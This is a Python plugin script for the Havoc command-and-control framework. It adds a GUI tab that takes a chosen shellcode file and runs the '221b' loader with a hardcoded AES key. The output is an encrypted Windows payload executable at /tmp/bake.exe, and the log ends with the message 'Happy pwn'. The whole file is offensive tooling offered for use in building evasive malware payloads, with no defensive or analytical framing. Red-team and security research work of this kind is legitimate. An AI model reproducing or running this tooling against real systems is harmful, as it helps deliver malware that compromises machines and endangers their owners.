#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: @jenaye_fr
# Created on: Mon, 17. Nov 2023
# Description: CMEPW Loader support for Havoc C2 framework
# Usage: Load this script into Havoc: Scripts -> Scripts Manager -> Load to create CMEPW Tab

import os, sys, subprocess
import threading
import havoc
import havocui
from datetime import datetime

# Configuration
loader_path = "/media/jenaye/data/tools/221b"
payload_file_path = "/tmp/payload.bin"

# Variables & Defaults
shellcode_path = ""

# Colors
havoc_error = "#ff5555" # Red
havoc_success = "#50fa7b" # Green
havoc_comment = "#6272a4" # Greyish blue
havoc_dark = "#555766" # Dark Grey
havoc_info = "#8be9fd" # Cyan
havoc_warning = "#ffb86c" # Orange

if not os.path.exists(loader_path):
    print("[-] Loader not found in: ", loader_path) 
    havocui.messagebox("Loader not found in: ", loader_path)
os.chdir(loader_path)

# Create dialog and log widget
dialog = havocui.Dialog("CMEPW Payload Generator", True, 670, 300)
log = havocui.Logger("CMEPW Log")


label_to_replace = f"<b style=\"color:{havoc_error};\">No shellcode selected.</b>"
def change_shellcode_path(): 
    global shellcode_path
    global label_to_replace
    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", shellcode_path, ".")
    formatted_shellcode_path = f"<span style=\"color:{havoc_success};\">{shellcode_path}</span>"
    dialog.replaceLabel(label_to_replace, formatted_shellcode_path)
    label_to_replace = formatted_shellcode_path if shellcode_path != " " else f"<b style=\"color:{havoc_error};\">No shellcode selected.</b>" 


# Execute Shhhloader and get output
def execute(file): 
    log.addText(f"[<span style=\"color:{havoc_info};\">*</span>] Selecting output file path.")

    os.system(f'{loader_path}/221b bake -m aes -k "0123456789ABCDEF1123345611111111" -s {shellcode_path} -o /tmp/bake.exe')
    # give the user the option of choosing the key

    # Create Log
    log.addText(f"this command has been be executed :  {loader_path}/221b bake -m aes -k '0123456789ABCDEF1123345611111111' -s {shellcode_path} -o /tmp/bake.exe')")
    log.addText(f"<b style=\"color:{havoc_success};\">Payload generated successfully at /tmp/bake.exe! Happy pwn</b>")
    log.setBottomTab()

# Generate payload
def run():
    log.setBottomTab()
    log.addText(f"<b style=\"color:{havoc_dark};\">───────────────────────────────</b>")
    log.addText(f"<b style=\"color:{havoc_comment};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")

   
    if shellcode_path == "":
        havocui.messagebox("Error", "Please specify a valid shellcode path.")
        log.addText(f"[<span style=\"color:{havoc_error};\">-</span>] No shellcode file specified.")
        return
    execute(shellcode_path)

    dialog.close()

def build(): 
    dialog.clear()

    # Get Listeners
    global listeners
    listeners = havoc.GetListeners()

    # Build Dialog
    dialog.addLabel(f"<b>────────────────────────────── Required Settings ──────────────────────────────</b>")
    dialog.addButton("Choose shellcode", change_shellcode_path)
    dialog.addLabel(label_to_replace)
    dialog.addButton("Generate", run)
    dialog.exec() 

# Create Tab 
def loader_generator():
    build()
havocui.createtab("CMEPW", "221b loader", loader_generator)
